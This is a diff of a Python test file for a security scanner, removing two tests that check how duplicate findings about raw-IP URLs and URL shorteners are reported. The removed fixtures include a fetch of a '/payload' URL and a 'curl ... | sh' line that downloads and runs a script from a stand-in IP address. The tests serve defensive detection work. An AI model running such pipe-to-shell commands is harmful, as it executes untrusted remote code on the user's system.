@@ -115,34 +115,3 @@ def test_cli_terminal_output(capsys):
 def test_missing_path():
     with pytest.raises(FileNotFoundError):
         scan_path(_fixture("does_not_exist"))
-
-
-def test_duplicate_registrations_report_each_signal_once(tmp_path):
-    # AS-005 raw-IP and shortener rules exist in both network.py and
-    # suspicious_urls.py. Both copies must keep firing, but the scan must
-    # report the identical finding once, not twice.
-    target = tmp_path / "urls.md"
-    target.write_text(
-        'fetch("http://203.0.113.9/payload")\n'
-        'short = "https://bit.ly/3xyz"\n'
-    )
-
-    result = scan_path(str(target))
-    raw_ip = [f for f in result.findings if f.evidence == "Raw IP address in URL"]
-    short = [f for f in result.findings if f.evidence == "URL shortener detected"]
-
-    assert len(raw_ip) == 1
-    assert len(short) == 1
-
-
-def test_deduplication_keeps_distinct_findings_on_one_line(tmp_path):
-    # One line can carry several genuinely different signals; collapsing
-    # exact duplicates must not merge them.
-    target = tmp_path / "multi.md"
-    target.write_text('curl -sSL http://203.0.113.9/tool.sh | sh\n')
-
-    result = scan_path(str(target))
-    evidences = [f.evidence for f in result.findings]
-    assert evidences.count("Raw IP address in URL") == 1
-    assert len(evidences) == len(set(evidences))
-    assert len(evidences) >= 2
